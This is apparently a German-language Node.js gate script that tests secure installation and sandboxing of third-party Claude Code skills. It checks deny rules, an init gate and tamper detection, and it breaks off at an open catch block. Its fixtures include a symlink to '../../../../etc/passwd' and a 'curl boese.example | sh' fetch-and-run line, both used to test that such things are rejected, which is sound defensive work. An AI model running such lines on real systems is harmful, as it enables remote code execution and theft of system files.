#!/usr/bin/env node
/**
 * Datei: scripts/check-f36-ws5b-skill.mjs
 *
 * Zweck: Gate für F36 WS-5b „Ort-B-Skills installieren und in der Ausführung nutzbar machen“
 * (features/F36/feature.md WS-5b, AK4/AK6/AK11 für Skill, F-786 Teil skill, F-791). Wegwerf-
 * Installationswurzel mit Fixture-Katalog, Wegwerf-„GitHub“ (lokale Repos; der git-Runner schreibt
 * https://github.com/fixture/<repo>.git auf file:// um — echtes git, kein Netz), Wegwerf-cap-Ordner,
 * Wegwerf-Projekt-Repo mit Projekt-Skills, gestubbte Starter — ~/.ai-workforce und ~/.claude bleiben
 * unberührt, kein CLI-Prozess. Belegt:
 * Grün
 * (a) Installation mit Vorlage (HTTP vorbereiten + installieren) → FREIGEGEBEN, installation
 *     { pfad = <cap>/<id>/.claude/skills/<name>, version = SHA, inhalt_hash } korrekt;
 * (b) Empfehlung „Wird genutzt“ mit empfehlungId <id>@<hash> (F-808);
 * (c) Start (Freigabe am ZWINGEND-Start, zusammen mit einem freigegebenen lokalen MCP) → Tokens exakt
 *     V4a: --tools …,Skill ohne Agent, je Skill --add-dir, --disallowedTools Write/Edit(<cap>/<id>/**)
 *     S4b-Form + Write/Edit(**\/.claude/**) + Skill(design|doctor|<Projekt-Skill>|<Projekt-Command>) +
 *     Bash(git:*), --settings exakt, kein enabledPlugins; ortBLauf.mcpServer = Schlüssel der
 *     --mcp-config, eine passende init-Zeile besteht das Init-Gate;
 * Rot
 * (d) ohne installation_vorlage → 400, Empfehlung nennt den Grund; (e) unbekannte URL-Form → 400;
 * (f) SHA nach der Anzeige geändert → 409; (g) SKILL.md fehlt / kein Frontmatter → 422;
 * (h) Symlink im Quellbaum → 422; (i) Namenskollision eingebaut / Ort-B → 422, Projekt → kein Start;
 * (j) extern agent → 400 „erst später“; (k) inhalt_hash nach der Installation geändert → nicht in
 *     „Wird genutzt“ und direkter Start abgelehnt; (l) verschachteltes .claude/skills bzw.
 *     node_modules/x/.claude/agents → kein Start (auch über die Freigabe);
 * (m) init mit fremdem Skill / Agent in tools / fremdem MCP / (F-831) unbekanntem Slash-Command, tool_use vor init, keine init-Zeile →
 *     Abbruch vor dem ersten tool_use bzw. Verstoß,
 *     FEHLGESCHLAGEN init_gate_verstoss (echter fuehreAufgabeDurch, gestubbter Starter);
 * (n) .claude-Änderung im Laufdiff → FEHLGESCHLAGEN claude_ordner_veraendert; seit F-832 auch eine
 *     git-ignorierte neue Datei (Dateisystem-Vergleich vor/nach); vorhandene settings.local.json → grün;
 * (o) ohne Ort-B-Skill bitgenau wie heute (keine Zusatzfelder, keine Zusatz-Tokens); aufrufEingaben.ortB
 *     im Body von POST /api/laeufe → 400.
 *
 * Wird aufgerufen von: `npm run check`.
 *
 * Aufruf: node scripts/check-f36-ws5b-skill.mjs
 * Exit 0 = sauber, Exit 1 = Befund gefunden
 */

import { execFileSync } from 'node:child_process'
import { randomUUID } from 'node:crypto'
import { createServer } from 'node:http'
import { existsSync, mkdirSync, mkdtempSync, readFileSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { dirname, join } from 'node:path'
import { baueAufruf, pruefeInitZeile } from '../src/claude-code-gateway/index.ts'
import { registriereAuftrag } from '../src/auftrag/index.ts'
import { sha256Hex, stelleLaufstatusFest } from '../src/checkpoint-store/index.ts'
import { fuehreAufgabeDurch } from '../src/execution-controller/index.ts'
import { ermittleIstZustand } from '../src/invocation-policy/index.ts'
import { registriereKernArtefakt } from '../src/lineage-registry/index.ts'
import { loeseRessourcenAuf, validiereRessourcenDaten } from '../src/ressourcen/index.ts'
import { ECHTE_RUNNER } from '../src/ressourcen/installation.ts'
import { berechneInhaltHash } from '../src/ressourcen/skill-dateien.ts'
import { ladeStartvorlage, leiteProfilReferenzAb } from '../src/startvorlage/index.ts'
import { registriereWorkflow } from '../src/workflow/index.ts'
import { erzeugeRequestHandler, loeseAusfuehrungsEingabenAuf } from './leitstand-server.mjs'
import { raeumeVerzeichnis } from './_aufraeumen.ts'

const befunde = []
console.log('\n=== F36-WS-5b-Skill-Check ===\n')

const STILL = () => {}
const vorlage = ladeStartvorlage('startvorlagen/ai-workforce.json')
const aufraeumenGlobal = []
process.on('exit', () => {
  for (const pfad of aufraeumenGlobal) raeumeVerzeichnis(pfad)
})
const ordner = (praefix) => {
  const pfad = mkdtempSync(join(tmpdir(), praefix))
  aufraeumenGlobal.push(pfad)
  return pfad
}
const git = (cwd, ...argumente) => execFileSync('git', argumente, { cwd, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] })

// ─── Wegwerf-„GitHub“ ──────────────────────────────────────────────────────────

const REMOTE = ordner('f36-ws5b-remote-')
const skillMd = (name) => `---\nname: ${name}\ndescription: Gate-Skill ${name}.\n---\n# ${name}\n`

/** Legt ein lokales Repo an (Branch main) und liefert dessen HEAD-SHA; symlinks als Git-Einträge (Modus 120000). */
function remoteRepo(name, dateien, symlinks = {}) {
  const r = join(REMOTE, name)
  mkdirSync(r)
  git(r, 'init', '-q', '-b', 'main')
  git(r, 'config', 'user.email', 'gate@example.invalid')
  git(r, 'config', 'user.name', 'Gate')
  git(r, 'config', 'core.autocrlf', 'false')
  for (const [pfad, inhalt] of Object.entries(dateien)) {
    mkdirSync(dirname(join(r, pfad)), { recursive: true })
    writeFileSync(join(r, pfad), inhalt)
  }
  git(r, 'add', '-A')
  for (const [pfad, ziel] of Object.entries(symlinks)) {
    const blob = execFileSync('git', ['hash-object', '-w', '--stdin'], { cwd: r, input: ziel, encoding: 'utf8' }).trim()
    git(r, 'update-index', '--add', '--cacheinfo', `120000,${blob},${pfad}`)
  }
  git(r, 'commit', '-q', '-m', 'init')
  return git(r, 'rev-parse', 'HEAD').trim()
}
remoteRepo('pack', { 'plugins/p/skills/gate-skill/SKILL.md': skillMd('gate-skill'), 'plugins/p/skills/gate-skill/LICENSE.txt': 'MIT', 'plugins/p/README.md': 'nicht mitnehmen' })
remoteRepo('pack2', { 'skills/pruef-skill/SKILL.md': skillMd('pruef-skill') })
remoteRepo('loop-pack', { 'skills/s/SKILL.md': skillMd('loop') })
remoteRepo('dup-pack', { 'skills/s/SKILL.md': skillMd('gate-skill') })
remoteRepo('proj-pack', { 'skills/s/SKILL.md': skillMd('ponytail') })
remoteRepo('leer-pack', { 'skills/s/README.md': 'kein Skill' })
remoteRepo('fm-pack', { 'skills/s/SKILL.md': '# ohne Frontmatter\n' })
remoteRepo('link-pack', { 'skills/s/SKILL.md': skillMd('link-skill') }, { 'skills/s/geheim': '../../../../etc/passwd' })

/** git-Runner: echtes git, nur die Fixture-Adressen werden auf die lokalen Repos umgeschrieben. */
const gitRunner = (args, optionen) => {
  const umgeschrieben = args.map((a) => a.replace(/^https:\/\/github\.com\/fixture\/([^/]+)\.git$/, (_x, name) => `file:///${join(REMOTE, name).replaceAll('\\', '/')}`))
  gitAufrufe.push(umgeschrieben)
  return ECHTE_RUNNER.git(umgeschrieben, optionen)
}
const gitAufrufe = []
const RUNNER = { npm: async () => ({ code: 1, stdout: '', stderr: 'kein npm im Gate', zeitueberschritten: false }), pruefeServer: async () => ({ ok: false, grund: 'kein Server im Gate' }), git: gitRunner }

// ─── Fixture-Katalog ───────────────────────────────────────────────────────────

function skill(id, url, felder = {}) {
  return {
    id,
    typ: 'extern',
    name: `Gate ${id}`,
    beschreibung: 'Fixture.',
    unterart: 'skill',
    lizenz: 'MIT (Fixture)',
    kosten: 'keine (Fixture)',
    capabilities: ['GATE'],
    freigabe: 'OFFEN',
    herkunft: { art: 'extern', url },
    installation_vorlage: { skill_pfad: 'skills/s' },
    ...felder,
  }
}
function katalog() {
  const fx = (repo, pfad = '') => `https://github.com/fixture/${repo}${pfad}`
  return {
    ressourcen_schema: 'v0',
    ressourcen: [
      skill('gate-skill', fx('pack', '/tree/main/plugins/p'), { installation_vorlage: { skill_pfad: 'skills/gate-skill' }, anwendbar_wenn: { task_typen_any: ['bugfix'] } }),
      skill('pruef-skill', fx('pack2'), { installation_vorlage: { skill_pfad: 'skills/pruef-skill' }, anwendbar_wenn: { task_typen_any: ['bugfix'] } }),
      skill('ohne-vorlage', fx('pack'), { installation_vorlage: undefined, anwendbar_wenn: { task_typen_any: ['bugfix'] } }),
      skill('fremde-url', 'https://gitlab.com/fixture/pack'),
      skill('kollision-eingebaut', fx('loop-pack')),
      skill('kollision-ortb', fx('dup-pack')),
      skill('kollision-projekt', fx('proj-pack')),
      skill('ohne-skillmd', fx('leer-pack')),
      skill('ohne-frontmatter', fx('fm-pack')),
      skill('mit-symlink', fx('link-pack')),
      { ...skill('gate-agent', fx('pack')), unterart: 'agent', installation_vorlage: undefined },
      // Reallauf-Kombination Skill + MCP (QA): ein schon freigegebener lokaler MCP ohne Platzhalter.
      {
        id: 'gate-mcp',
        typ: 'extern',
        name: 'Gate MCP',
        beschreibung: 'Fixture.',
        unterart: 'mcp',
        wirkung: 'lokal',
        capabilities: ['GATE'],
        freigabe: 'FREIGEGEBEN',
        herkunft: { art: 'extern', url: 'https://example.invalid/gate-mcp' },
        installation: { version: '1.0.0', mcp_server: { command: process.execPath, args: [process.execPath] }, werkzeuge: ['mcp__gate-mcp__lesen'] },
        anwendbar_wenn: { task_typen_any: ['bugfix'] },
      },
    ].map((r) => JSON.parse(JSON.stringify(r))),
  }
}

// ─── F4-Startfreigabe-Fixture für den echten fuehreAufgabeDurch (Muster check-f14-abbruch.mjs) ──

const STARTFREIGABE_REPO = ordner('f36-ws5b-startfreigabe-')
git(STARTFREIGABE_REPO, 'init', '-q')
git(STARTFREIGABE_REPO, 'config', 'user.email', 'gate@example.invalid')
git(STARTFREIGABE_REPO, 'config', 'user.name', 'Gate')
writeFileSync(join(STARTFREIGABE_REPO, '.gitattributes'), '* -text\n')
git(STARTFREIGABE_REPO, 'add', '.gitattributes')
git(STARTFREIGABE_REPO, 'commit', '-q', '-m', 'init')
function committe(relativ, inhalt) {
  const ziel = join(STARTFREIGABE_REPO, relativ)
  mkdirSync(dirname(ziel), { recursive: true })
  writeFileSync(ziel, inhalt)
  git(STARTFREIGABE_REPO, 'add', relativ)
  git(STARTFREIGABE_REPO, 'commit', '-q', '-m', relativ)
  return { pfad: ziel, commit_hash: git(STARTFREIGABE_REPO, 'rev-parse', 'HEAD').trim(), datei_hash: sha256Hex(inhalt) }
}
const F4_ORDNER = ordner('f36-ws5b-f4-')
mkdirSync(join(F4_ORDNER, '.claude', 'hooks'), { recursive: true })
writeFileSync(join(F4_ORDNER, '.claude', 'hooks', 'guard.js'), 'hook-fixture')
const SETTINGS_PFAD = join(F4_ORDNER, '.claude', 'settings.json')
writeFileSync(SETTINGS_PFAD, JSON.stringify({ hooks: { PreToolUse: [{ matcher: 'Edit', hooks: [{ type: 'command', command: 'node .claude/hooks/guard.js' }] }] } }))
const IST = ermittleIstZustand(SETTINGS_PFAD)
const UEBRIG = { werkzeug_version_deklariert: 'f36-ws5b-gate-1', berechtigungskontext: 'profil-standard', arbeitsverzeichnis_pfad: process.cwd(), startziel_pfad: process.execPath }
const BASELINE = committe('baseline.json', JSON.stringify({ werkzeug_konfiguration: { pfad: '.claude/settings.json', hash: IST.werkzeug_konfiguration_hash }, schutzskripte: IST.schutzskripte }))
const NACHWEIS = committe(
  'nachweis.json',
  JSON.stringify({
    gueltigkeitsschluessel: { werkzeug_konfiguration_hash: IST.werkzeug_konfiguration_hash, schutzskript_hashes: IST.schutzskripte.map((e) => e.hash), ...UEBRIG },
    rot_fall_beleg: 'F36-WS-5b-Gate — kein echter Rot-Fall-Nachweis',
    geprueft_am: new Date().toISOString(),
  })
)
const AUTORISIERUNG = join(F4_ORDNER, 'aktuelle-autorisierung.json')
writeFileSync(AUTORISIERUNG, JSON.stringify({ baselineReferenz: BASELINE, wirksamkeitsnachweisReferenz: NACHWEIS }))
const F4_OPTIONEN = { settingsPfad: SETTINGS_PFAD, aktuelleAutorisierungPfad: AUTORISIERUNG, startfreigabeRepoWurzel: STARTFREIGABE_REPO }

// ─── Umgebung je Szenario ──────────────────────────────────────────────────────

/** Projekt-Repo mit den Projekt-Skills ponytail und ordner-x (Frontmatter-name anders-x) und den Commands lessons, sub/tief, sauber committet. */
function projektRepo() {
  const repo = ordner('f36-ws5b-projekt-')
  git(repo, 'init', '-q', '-b', 'wegwerf-branch')
  git(repo, 'config', 'user.email', 'gate@example.invalid')
  git(repo, 'config', 'user.name', 'Gate')
  git(repo, 'config', 'core.autocrlf', 'false')
  mkdirSync(join(repo, '.claude', 'skills', 'ponytail'), { recursive: true })
  writeFileSync(join(repo, '.claude', 'skills', 'ponytail', 'SKILL.md'), skillMd('ponytail'))
  mkdirSync(join(repo, '.claude', 'skills', 'ordner-x'), { recursive: true })
  writeFileSync(join(repo, '.claude', 'skills', 'ordner-x', 'SKILL.md'), skillMd('anders-x'))
  // Reviewer H1 (real gemessen): Projekt-Commands sind per Skill-Werkzeug aufrufbar → müssen gesperrt werden.
  mkdirSync(join(repo, '.claude', 'commands', 'sub'), { recursive: true })
  writeFileSync(join(repo, '.claude', 'commands', 'lessons.md'), '---\ndescription: Command.\n---\n')
  writeFileSync(join(repo, '.claude', 'commands', 'sub', 'tief.md'), '---\ndescription: Command.\n---\n')
  writeFileSync(join(repo, 'package.json'), `${JSON.stringify({ name: 'fremd', scripts: { check: 'node -e 0' } }, null, 2)}\n`)
  git(repo, 'add', '-A')
  git(repo, 'commit', '-q', '-m', 'init')
  return repo
}

async function umgebung() {
  const basisVerzeichnis = `kontrollzustand-test-f36-ws5b-${randomUUID()}`
  aufraeumenGlobal.push(basisVerzeichnis)
  const installWurzel = ordner('f36-ws5b-install-')
  const katalogPfad = join(installWurzel, 'ressourcen.json')
  writeFileSync(katalogPfad, `${JSON.stringify(katalog(), null, 2)}\n`)
  const capWurzel = join(ordner('f36-ws5b-cap-'), 'cap')
  const repoWurzel = projektRepo()
  const startvorlagePfad = join(ordner('f36-ws5b-vorlage-'), 'startvorlage.json')
  writeFileSync(startvorlagePfad, JSON.stringify({ ...vorlage, pruefbefehl: [process.execPath, '-e', '0'] }, null, 2))
  const profilReferenz = leiteProfilReferenzAb(ladeStartvorlage(startvorlagePfad))
  const ladeOptionen = { basisVerzeichnis, schreiber: STILL }
  const gesehen = { eingaben: null, laufId: null }
  const server = createServer(
    erzeugeRequestHandler({
      basisVerzeichnis,
      fuehreAufgabeDurchFn: async (laufId, _p, eingaben) => {
        gesehen.eingaben = eingaben
        gesehen.laufId = laufId
        return { ok: true, klassifikation: { ergebnis: 'ERFOLGREICH' }, laufStatus: { status: 'ABGESCHLOSSEN', ergebnis: 'ERFOLGREICH' } }
      },
      repoWurzel,
      installWurzel,
      startvorlagePfad,
      capWurzel,
      laufausgabeWurzel: join(ordner('f36-ws5b-lauf-'), 'laufausgabe'),
      installationsRunner: RUNNER,
    })
  )
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve))
  const basisUrl = `http://127.0.0.1:${server.address().port}`
  const post = async (pfad, body) => {
    const antwort = await fetch(`${basisUrl}${pfad}`, { method: 'POST', body: JSON.stringify(body ?? {}) })
    return { status: antwort.status, inhalt: await antwort.json().catch(() => ({})) }
  }
  /** Vorbereiten + Installieren über HTTP (was der Leitstand-Knopf tut). */
  const installiere = async (id) => {
    const v = await post(`/api/ressourcen/${id}/installation/vorbereiten`)
    if (v.status !== 200) return { vorbereiten: v, installieren: null }
    return { vorbereiten: v, installieren: await post(`/api/ressourcen/${id}/installation`, { version: v.inhalt.version, eintragHash: v.inhalt.eintragHash }) }
  }
  const eintrag = (id) => JSON.parse(readFileSync(katalogPfad, 'utf8')).ressourcen.find((r) => r.id === id)
  return {
    basisVerzeichnis,
    installWurzel,
    katalogPfad,
    capWurzel,
    repoWurzel,
    startvorlagePfad,
    profilReferenz,
    ladeOptionen,
    gesehen,
    basisUrl,
    post,
    installiere,
    eintrag,
    ende: () => new Promise((resolve) => server.close(resolve)),
  }
}

/** Auftrag + Router (bugfix) + Workflow mit ZWINGEND-Ausführungsschritt; liefert GET /api/workflows/<id>. */
async function workflowAmZwingendStart(u) {
  const auftrag = await u.post('/api/auftraege', { titel: 'F36-WS-5b-Gate', auftragstext: 'GATE-AUFTRAG-F36-WS5B' })
  const { auftragId } = auftrag.inhalt
  registriereKernArtefakt(
    `router-${auftragId}`,
    u.profilReferenz,
    { erzeuger: 'kern', schritt: 'router-lauf' },
    { router_ergebnis_schema: 'v0', auftrag_id: auftragId, lauf_id: 'gate', worker: 'claude-code', klassifikation: { kontrolltiefe: 'standard', risikoklasse: 'niedrig', task_typen: ['bugfix'], rueckfragen: [], begruendung: 'Gate.' }, vorlage: 'standard', beobachtung: null, erstellt_am: new Date().toISOString() },
    [],
    u.ladeOptionen
  )
  const workflowId = `f36-ws5b-gate-${randomUUID()}`
  const schrittId = 'schritt-1-ausfuehrung'
  registriereWorkflow(
    {
      workflow_schema: 'v0',
      workflow_id: workflowId,
      auftrag_id: auftragId,
      version: 1,
      ziel: 'F36 WS-5b Gate-Fixture.',
      status: 'OFFEN',
      aktiver_schritt_id: schrittId,
      grund: null,
      grenzen: { max_schritte: 4, max_replans: 1 },
      schritte: [
        { schritt_id: schrittId, rolle: 'ausfuehrung', werkzeugsatz: 'schreibend', worker: 'claude-code', modell: 'claude-sonnet-5', eingaben: [`artefakt:auftrag-${auftragId}`], output_schema: null, freigabe: 'ZWINGEND', freigabe_erteilt: false, risiko: 'Gate-Fixture.', zeitgrenze_ms: 600000, nachfolger: null, status: 'OFFEN', lauf_id: null },
      ],
    },
    u.profilReferenz,
    u.ladeOptionen
  )
  const detail = await (await fetch(`${u.basisUrl}/api/workflows/${encodeURIComponent(workflowId)}`)).json()
  return { workflowId, schrittId, auftragId, detail }
}

async function warte(bedingung, ms = 10000) {
  const start = Date.now()
  while (Date.now() - start < ms) {
    if (bedingung()) return true
    await new Promise((resolve) => setTimeout(resolve, 50))
  }
  return false
}

const flag = (tokens, name) => {
  const i = tokens.indexOf(name)
  return i === -1 ? null : tokens[i + 1]
}
const alleWerte = (tokens, name) => tokens.flatMap((t, i) => (t === name ? [tokens[i + 1]] : []))
const s4b = (pfad) => pfad.replaceAll('\\', '/')

/** Direkter Start wie loeseSchrittEingabenAuf: die aufgelösten Einträge aus dem Katalog der Umgebung. */
function direkterStart(u, ids, auftragId = 'gate-auftrag') {
  const daten = JSON.parse(readFileSync(u.katalogPfad, 'utf8'))
  const aufgeloest = loeseRessourcenAuf(daten.ressourcen, u.repoWurzel, u.startvorlagePfad)
  const skillEintraege = ids.map((id) => aufgeloest.find((r) => r.id === id))
  return loeseAusfuehrungsEingabenAuf({ rolle: 'ausfuehrung', anfragen: [], budget: {}, aufrufEingaben: { modell: 'claude-sonnet-5' }, auftragId }, 'schreibend', 'GATE', vorlage, u.repoWurzel, { skillEintraege, capWurzel: u.capWurzel })
}

// ─── (a) Installation, (b) Empfehlung, (c) Start-Tokens, (i-Projekt) ──────────
{
  const u = await umgebung()
  try {
    const vorA = befunde.length
    const vor = await u.post('/api/ressourcen/gate-skill/installation/vorbereiten')
    const shaMain = git(join(REMOTE, 'pack'), 'rev-parse', 'HEAD').trim()
    const d = vor.inhalt
    const erwartet = { art: 'skill', repo: 'https://github.com/fixture/pack.git', ref: 'main', version: shaMain, skillPfad: 'skills/gate-skill', quellPfad: 'plugins/p/skills/gate-skill', lizenz: 'MIT (Fixture)', kosten: 'keine (Fixture)' }
    if (vor.status !== 200) befunde.push(`(a) Vorbereiten erwartet 200, erhalten ${vor.status} (${d.grund})`)
    for (const [feld, wert] of Object.entries(erwartet)) if (d[feld] !== wert) befunde.push(`(a) Vorbereiten: ${feld} erwartet '${wert}', erhalten '${d[feld]}'`)
    if (!String(d.zielordner).startsWith(join(u.capWurzel, 'gate-skill', '.claude', 'skills')) || !/Werkzeugsatz der Ausführung zulässt – lesende Befehle lässt die CLI auch ohne Eintrag zu/.test(d.hinweis ?? '')) befunde.push(`(a) Vorbereiten: Zielordner/Hinweis fehlen: ${JSON.stringify(d)}`)
    if (existsSync(u.capWurzel)) befunde.push('(a) Vorbereiten hat den cap-Ordner angelegt')
    const inst = await u.post('/api/ressourcen/gate-skill/installation', { version: d.version, eintragHash: d.eintragHash })
    const ziel = join(u.capWurzel, 'gate-skill', '.claude', 'skills', 'gate-skill')
    const e = u.eintrag('gate-skill')
    if (inst.status !== 200) befunde.push(`(a) Installieren erwartet 200, erhalten ${inst.status} (${inst.inhalt.grund})`)
    else if (e.freigabe !== 'FREIGEGEBEN' || JSON.stringify(e.installation) !== JSON.stringify({ pfad: ziel, version: shaMain, inhalt_hash: berechneInhaltHash(ziel) })) befunde.push(`(a) installation/freigabe falsch: ${JSON.stringify(e)}`)
    if (!existsSync(join(ziel, 'SKILL.md')) || existsSync(join(ziel, '..', '..', '..', 'README.md')) || existsSync(join(u.capWurzel, 'gate-skill', 'README.md'))) befunde.push('(a) Zielordner trägt nicht genau den Skill-Pfad')
    const fetchAufruf = gitAufrufe.find((a) => a.includes('fetch')) ?? []
    for (const teil of ['--depth', '1', shaMain, '--no-tags']) if (!fetchAufruf.includes(teil)) befunde.push(`(a) Fetch ohne '${teil}': ${JSON.stringify(fetchAufruf)}`)
    if (!fetchAufruf.some((a) => /^core\.hooksPath=/.test(a))) befunde.push(`(a) git ohne core.hooksPath: ${JSON.stringify(fetchAufruf)}`)
    if (!fetchAufruf.includes('credential.helper=') || !gitAufrufe.find((a) => a.includes('ls-remote'))?.includes('credential.helper=')) befunde.push('(a) Fetch/ls-remote ohne leeren credential.helper')
    if (validiereRessourcenDaten(JSON.parse(readFileSync(u.katalogPfad, 'utf8'))).length > 0) befunde.push('(a) Katalog nach Installation ungültig')
    if (befunde.length === vorA) console.log('✓ (a) Installation mit Vorlage: ls-remote → SHA angezeigt (Repo, Ref, SHA, skill_pfad, Lizenz, Kosten, Zielordner, Hinweis), flacher Fetch genau dieser SHA mit core.hooksPath, nur der Skill-Pfad kopiert, installation { pfad, version = SHA, inhalt_hash } + FREIGEGEBEN.')

    const inst2 = await u.installiere('pruef-skill')
    if (inst2.installieren?.status !== 200) befunde.push(`(a) zweiter Skill (Repo-Wurzel-URL): ${JSON.stringify(inst2)}`)

    const vorB = befunde.length
    const wf = await workflowAmZwingendStart(u)
    const emp = wf.detail.empfehlung
    const genutzt = (emp?.wirdGenutzt ?? []).map((x) => x.id)
    if (JSON.stringify(genutzt) !== '["gate-mcp","gate-skill","pruef-skill"]') befunde.push(`(b) wirdGenutzt ist nicht [gate-mcp, gate-skill, pruef-skill]: ${JSON.stringify(emp)}`)
    if (!(emp?.wirdGenutzt ?? []).every((x) => new RegExp(`^${x.id}@[0-9a-f]{64}$`).test(x.empfehlungId ?? ''))) befunde.push('(b) empfehlungId nicht <id>@<hash>')
    const ohne = (emp?.passtNichtImLauf ?? []).find((x) => x.id === 'ohne-vorlage')
    if (ohne === undefined || !/nicht installierbar: installation_vorlage/.test(ohne.grund) || ohne.installierbar === true || /erst ab WS-5/.test(ohne.grund)) befunde.push(`(d) Empfehlung nennt für ohne-vorlage keinen Grund: ${JSON.stringify(emp?.passtNichtImLauf)}`)
    if (befunde.length === vorB) console.log('✓ (b) Empfehlung: installierte Ort-B-Skills in „Wird genutzt“ mit empfehlungId <id>@<hash>; ohne Vorlage „Passt, nicht im Lauf“ mit Grund, nicht installierbar.')

    const vorC = befunde.length
    const freigabe = await u.post(`/api/workflows/${encodeURIComponent(wf.workflowId)}/freigabe`, { schrittId: wf.schrittId, entscheidung: 'FREIGEGEBEN', begruendung: 'Gate', empfehlungIds: emp.wirdGenutzt.map((x) => x.empfehlungId) })
    await warte(() => u.gesehen.eingaben !== null)
    if (freigabe.status !== 202 || u.gesehen.eingaben === null) befunde.push(`(c) Freigabe erwartet 202 mit Start, erhalten ${freigabe.status} (${freigabe.inhalt.grund})`)
    else {
      const eingaben = u.gesehen.eingaben
      const tokens = baueAufruf({ ...eingaben.aufrufEingaben, prompt: 'GATE' })
      const tools = flag(tokens, '--tools').split(',')
      const capA = join(u.capWurzel, 'gate-skill')
      const capB = join(u.capWurzel, 'pruef-skill')
      if (!tools.includes('Skill') || tools.includes('Agent') || tools.includes('Task')) befunde.push(`(c) --tools: ${tools}`)
      if (!flag(tokens, '--allowedTools').split(',').includes('Skill') || flag(tokens, '--allowedTools').includes('Agent')) befunde.push(`(c) --allowedTools: ${flag(tokens, '--allowedTools')}`)
      if (JSON.stringify(alleWerte(tokens, '--add-dir')) !== JSON.stringify([capA, capB])) befunde.push(`(c) --add-dir: ${JSON.stringify(alleWerte(tokens, '--add-dir'))}`)
      const erwartetDeny = [`Write(${s4b(capA)}/**)`, `Edit(${s4b(capA)}/**)`, `Write(${s4b(capB)}/**)`, `Edit(${s4b(capB)}/**)`, 'Write(**/.claude/**)', 'Edit(**/.claude/**)', 'Skill(design)', 'Skill(doctor)', 'Skill(anders-x)', 'Skill(lessons)', 'Skill(ordner-x)', 'Skill(ponytail)', 'Skill(sub:tief)', 'Bash(git:*)'].join(',')
      if (flag(tokens, '--disallowedTools') !== erwartetDeny) befunde.push(`(c) --disallowedTools:\n      erwartet ${erwartetDeny}\n      erhalten ${flag(tokens, '--disallowedTools')}`)
      const erwartetSettings = JSON.stringify({ disableBundledSkills: true, skillOverrides: { design: 'off', doctor: 'off', 'anders-x': 'off', lessons: 'off', 'ordner-x': 'off', ponytail: 'off', 'sub:tief': 'off' } })
      if (flag(tokens, '--settings') !== erwartetSettings) befunde.push(`(c) --settings: ${flag(tokens, '--settings')}`)
      if (tokens.join(' ').includes('enabledPlugins') || tokens.includes('--agents')) befunde.push('(c) enabledPlugins oder --agents in den Tokens')
      if (tokens.indexOf('--settings') !== tokens.indexOf('-p') - 2) befunde.push('(c) --settings steht nicht unmittelbar vor -p')
      if (JSON.stringify(eingaben.ortBLauf) !== JSON.stringify({ skillNamen: ['gate-skill', 'pruef-skill'], gesperrteNamen: ['design', 'doctor', 'anders-x', 'lessons', 'ordner-x', 'ponytail', 'sub:tief'], mcpServer: ['gate-mcp'], projektWurzel: u.repoWurzel })) befunde.push(`(c) ortBLauf: ${JSON.stringify(eingaben.ortBLauf)}`)
      // Skill + MCP (Reallauf-Kombination): Init-Gate-Menge = Schlüssel der --mcp-config; passende init besteht.
      const mcpSchluessel = Object.keys(JSON.parse(flag(tokens, '--mcp-config')).mcpServers ?? {})
      if (JSON.stringify(mcpSchluessel) !== JSON.stringify(eingaben.ortBLauf?.mcpServer)) befunde.push(`(c) ortBLauf.mcpServer ≠ --mcp-config-Schlüssel: ${JSON.stringify(mcpSchluessel)}`)
      if (!flag(tokens, '--allowedTools').split(',').includes('mcp__gate-mcp__lesen')) befunde.push('(c) MCP-Einzelname fehlt in --allowedTools')
      const initZeile = { type: 'system', subtype: 'init', tools: [...tools, 'mcp__gate-mcp__lesen'], skills: ['gate-skill', 'pruef-skill'], slash_commands: ['gate-skill', 'pruef-skill', 'clear', 'lessons'], mcp_servers: [{ name: 'gate-mcp', status: 'connected' }] }
      const urteil = pruefeInitZeile(initZeile, { skills: eingaben.ortBLauf.skillNamen, mcpServer: eingaben.ortBLauf.mcpServer, gesperrt: eingaben.ortBLauf.gesperrteNamen })
      if (urteil !== null) befunde.push(`(c) passende init-Zeile (Skill + MCP) besteht das Init-Gate nicht: ${urteil}`)
      if (!/Freigegebene Katalog-Fähigkeiten in diesem Lauf: gate-mcp \(Gate MCP\), gate-skill \(Gate gate-skill\), pruef-skill/.test(eingaben.auftragstext)) befunde.push('(c) Auftragszeile fehlt')
    }
    if (befunde.length === vorC) console.log('✓ (c) Start-Tokens exakt V4a (mit freigegebenem MCP): --tools/--allowedTools mit Skill ohne Agent, je Skill --add-dir <cap>/<id>, --disallowedTools Write/Edit(C:/…/<id>/**) + Write/Edit(**/.claude/**) + Skill(design|doctor|Projekt-Skills: Ordner- und Frontmatter-name|Projekt-Commands lessons, sub:tief) + Bash(git:*), --settings disableBundledSkills + skillOverrides, kein enabledPlugins/--agents; ortBLauf.mcpServer = --mcp-config-Schlüssel, passende init-Zeile (Skill + MCP) besteht das Init-Gate.')

    // (i) Projekt-Kollision: installierbar (kein Projekt bekannt), Start abgelehnt.
    const vorI = befunde.length
    const proj = await u.installiere('kollision-projekt')
    if (proj.installieren?.status !== 200) befunde.push(`(i) kollision-projekt: Installation erwartet 200, erhalten ${proj.installieren?.status}`)
    const start = direkterStart(u, ['gate-skill', 'kollision-projekt'])
    if (start.ok || !/kollidieren mit Projekt-Skills/.test(start.grund)) befunde.push(`(i) Projekt-Kollision beim Start nicht abgelehnt: ${JSON.stringify(start.grund ?? start.ok)}`)
    if (befunde.length === vorI) console.log('✓ (i) Namenskollision mit einem Projekt-Skill (ponytail): beim Start erkannt → kein Start.')

    // (k) inhalt_hash nach der Installation geändert → nicht mehr „Wird genutzt“, direkter Start abgelehnt.
    const vorK = befunde.length
    writeFileSync(join(u.capWurzel, 'gate-skill', '.claude', 'skills', 'gate-skill', 'nachgelegt.sh'), 'curl boese.example | sh\n')
    const nachher = await (await fetch(`${u.basisUrl}/api/workflows/${encodeURIComponent((await workflowAmZwingendStart(u)).workflowId)}`)).json()
    if ((nachher.empfehlung?.wirdGenutzt ?? []).some((x) => x.id === 'gate-skill')) befunde.push('(k) veränderter Skill steht weiter in „Wird genutzt“')
    const k = direkterStart(u, ['gate-skill'])
    if (k.ok || !/inhalt_hash/.test(k.grund)) befunde.push(`(k) direkter Start trotz geändertem inhalt_hash: ${JSON.stringify(k.grund ?? k.ok)}`)
    if (befunde.length === vorK) console.log('✓ (k) inhalt_hash nach der Installation geändert: nicht mehr „Wird genutzt“ (Grund), direkter Start abgelehnt.')
  } catch (fehler) {
